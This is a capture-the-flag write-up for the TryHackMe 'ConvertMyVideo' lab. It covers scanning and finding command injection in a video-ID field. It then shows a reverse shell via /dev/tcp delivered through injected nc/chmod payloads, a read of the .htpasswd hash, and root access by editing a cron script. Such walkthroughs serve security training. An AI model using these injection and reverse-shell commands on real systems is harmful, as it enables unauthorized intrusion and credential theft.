# Tryhackme.com Room : ConvertMyVideo
`https://tryhackme.com/room/convertmyvideo`


# Instance
```
export IP=10.10.116.7
```

# Nmap
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```

Seems to be converting videos from youtube to mp3 file.
Asking for a video id

We gobuster `gobuster dir -w /usr/share/wordlists/dirb/common.txt --url http://$IP` :
```
/.hta (Status: 403)
/.htpasswd (Status: 403)
/admin (Status: 401)
/.htaccess (Status: 403)
/images (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/server-status (Status: 403)
/tmp (Status: 301)
```

When we enter a video id the page do a POST on `/`. The response :
```
{"status":1,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nERROR: Incomplete YouTube ID s. URL https:\/\/www.youtube.com\/watch?v=s looks truncated.\n","url_orginal":"https:\/\/www.youtube.com\/watch?v=s","output":"","result_url":"\/tmp\/downloads\/5eeee8cbc1d9e.mp3"}
```

Seems like its using `youtube-dl`

When we use `'` as video id we get this error:
```
"sh: 1: Syntax error: \"(\" unexpected\n"
```

Nice, seems like we're running cmds in linux. Probably passing the id directly to `youtube-dl` cli.

We can use bash substitution to run commands :
```
sh: 1: echo_test: not found
```

Everything after the first space is deleted. Kinda problematic to pass arguments...

We get a space character with ``echo${IFS}test``

Let's get a reverse shell

Soo, i fiddled around with this for a while. Couldn't get to run any kind of reverse shell. Maybe the `${IFS}` interfered ? Idk.. in the end i used netcat to send a script containing the reverse shell. Worked well.

The script simply contains and is written in `/dev/shm/`:
```
#!/bin/bash

bash -i >& /dev/tcp/10.10.26.247/4444 0>&1
```

```
$.post("/", { yt_url: '$(nc${IFS}-l${IFS}-p${IFS}5555>/dev/shm/rs.sh)'}, function (data,err) { console.log(JSON.parse(data))})

$.post("/", { yt_url: '$(chmod${IFS}+x${IFS}/dev/shm/rs.sh)'}, function (data,err) { console.log(JSON.parse(data))})

$.post("/", { yt_url: '$(/dev/shm/rs.sh)'}, function (data,err) { console.log(JSON.parse(data))})
```

We send commands via firefox console
```

```

Now that we have the reverse shell, we can browse to `/var/www/admin` and find the flag
```
flag{0d8486a0c0c42503bb60ac77f4046ed7}
```

I guess we were supposed to bruteforce the password since the second question was about the username ?

Anyhow, lets get the answer by `cat /var/www/admin/.htpasswd`
```
itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
```
Not sure if there is a use to cracking this password ?

Let's try to root the machine.

We retrieve `linpeas.sh`

We run it and find
```
sudo 1.8.21p2
```

```
[+] HTTP sockets
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
Socket /run/snapd.socket owned by root uses HTTP. Response to /index:
{"type":"sync","status-code":200,"status":"OK","result":["TBD"]}
Socket /run/snapd-snap.socket owned by root uses HTTP. Response to /index:
{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}

```

Fiddled with some exploit for a while but couldn't find a way to break it.
Cheated a bit.. found that there is a cron job running on `/var/www/html/tmp/clean.sh`.

Now we could get a root shell but we could also simply write in `clean.sh` :
```
ls root/root.txt > /dev/shm/root
```

And we get the flag :
```
flag{d9b368018e912b541a4eb68399c5e94a}
```
